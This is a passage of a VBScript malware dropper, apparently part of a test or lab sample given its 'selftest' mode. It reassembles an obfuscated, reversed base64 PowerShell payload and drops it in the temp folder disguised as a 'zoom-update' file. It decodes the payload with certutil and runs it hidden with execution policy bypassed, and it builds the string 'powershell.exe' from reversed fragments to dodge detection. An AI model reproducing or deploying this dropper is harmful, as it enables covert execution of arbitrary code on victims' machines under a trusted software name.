    "nwGbk5SblR3c5N1JoAEIgACIK0wJrUmep1Wa0B3bvcCI9Ayc", _
    "ukHdpJXdjV2Uu0WZ0NXeTdCLnwGbk5SZy92Qu0WZ0NXeTdCL", _
    "hVkcvZEI8BSKnwGbk5CcyFGaTNkL0Z2bz9mcjlWTnwyJsxGZ", _
    "yVmZlJlLwNGJdRWavZ3WgACIgACIgAiCNsHI0NWZqJ2Ttg2Y", _
    "gACIgoQD9BCIgAiCNkyXkgCZkFkLzVWasJWblN3cBRWZj5WZ", _
    "oN1QuQnZvN3byNWaNBCdjVmai9UL3VmTg0DIyVGZpZ3byBHJ", _
    "gQHb1NXZyRCIgACIK0gclRWa29mcQVGZvNEcyFGaTNkLwJXY", _
    "jJXdvNVbvJnR5xmYtV2czFUZslGct92QuIXZklmdvJHckASP", _
    "yJXRuQHb1NXZyRCKgYWagACIgoQDpU2YyV3bzRCIsA3YkgSZ", _
    "g0DI0hXZ0RCIgACIgACIgoQD7BSKwACdn1CI05WdvNkLzJ3b", _
    "F5CdsV3clJHJg4WagUGJoACajFWZy9mZgACIgACIgAiCNcyJ", _
    "gJCIrASKocmbpJHdT9GVuUGJg0zKgQHelRHJgsHIpMncvJnc", _
    "UxGbBVGdpJ3V6oTXlxWaG5yTJtFIgACIgACIgoQD9BiIuBmc", _
    "yV2dvBXLt92b6dCIQ1URUpjduVGJggGdhBVLul2bKhCK0hXZ", _
    "NIDI0lGelBCIgACIgACIK0QK0hXZ0RCIskyJn9GbuwGblh2c", _
    "kVGbpBXbvNkL0xWdzVmckASPgUGc5RHJgACIgoQD9BCIgAiC", _
    "gACIgoQDpciclRWYvxUbv9mWngSZwlHV0V2RukHbi1WZzNXQ", _
    "goQDpcibpFWTngCZvhGdl1EdldkLlBXe0RCI9ACZvhGdl1GJ", _
    "bhCImlGIgACIK0QRE9UTf10TPplO25WZkASPgUGZv1GJgACI", _
    "v1GJgsHIpkSZk9WbkgSe0BXbFJ3TsxWdONXS6oTXn5WayR3c", _
    "g0DIzdmcBV2avZnbpRCIgACIK0QfgcCbsFGdz5WanASPgUGZ", _
    "lt2b25WakACIgAiCNEDIn01W0NWZqJ2bnACdjVmai9UL3VmT", _
    "jRCIgACIK0QKlR2btRCKA1VXbdmbpJHdztFI9ASXws1cnJXQ", _
    "BV2avZnbpRCIswGb15GJoU2avZnbJ5CZvhGdl1GJg0DIlR2b", _
    "7BCajRXYjBSfK0QZk92Yk0Fdul2WgQXa4VGIgACIK0QKzdmc", _
    "0lmcXpjOdVGbpZkLPl0WgACIgACIgAiCNsHI5JHdgACIgoQD", _
    "t02bvp3JgAVTFRlO25WZkACa0FGUt4WavpEKoQHelRFbsFUZ", _
    "gAiCNkSKocmbpJHdT9GVu8FJgwSKnc2bs5CbsVGazJXZ39Gc", _
    "9pQDxACdphXZgACIgoQD9tHIoNGdhNGI9BCI" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
